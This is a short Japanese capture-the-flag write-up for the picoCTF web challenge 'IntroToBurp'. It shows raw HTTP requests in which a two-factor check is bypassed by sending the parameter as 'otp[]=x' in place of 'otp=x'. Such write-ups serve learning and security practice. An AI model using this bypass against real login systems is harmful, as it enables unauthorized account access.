---
title: "IntroToBurp"
points: 100
tags: ["web"]
---

Registration -> 2FA -> DashboardとWebページが遷移していく。

もちろんCTFなので電話番号に対して2FAが飛んでくることはなく、メインは2FAのバイパス。

対象となるのは以下のようなリクエスト。

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51904
Origin: http://titan.picoctf.net:51904
Content-Type: application/x-www-form-urlencoded
Cookie: session=.eJw9jEkKAyEURO_iOouo6NdcRhy-dEi3igOdEHL3diHZVb3i1Zf4Z_-QB3mTG_GtRtPzC9METMngAwUrvKaMMw6WCs-dlgruWoDlNCrgbnpx7LtJ9sD1k3uZSSoBoGYttrUz17DWsuWEJo3DYV1oNKx__3cBimIr6g.ZgW_LQ.singJ3PgnJ_PyvibdXcnVesc8Ig
Content-Length: 5

otp=x
```

OTPパラメータの存在確認をしておらず、[]を付与したらバイパスが可能だった。

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51904
Origin: http://titan.picoctf.net:51904
Content-Type: application/x-www-form-urlencoded
Cookie: session=.eJw9jEkKAyEURO_iOouo6NdcRhy-dEi3igOdEHL3diHZVb3i1Zf4Z_-QB3mTG_GtRtPzC9METMngAwUrvKaMMw6WCs-dlgruWoDlNCrgbnpx7LtJ9sD1k3uZSSoBoGYttrUz17DWsuWEJo3DYV1oNKx__3cBimIr6g.ZgW_LQ.singJ3PgnJ_PyvibdXcnVesc8Ig
Content-Length: 5

otp[]=x
```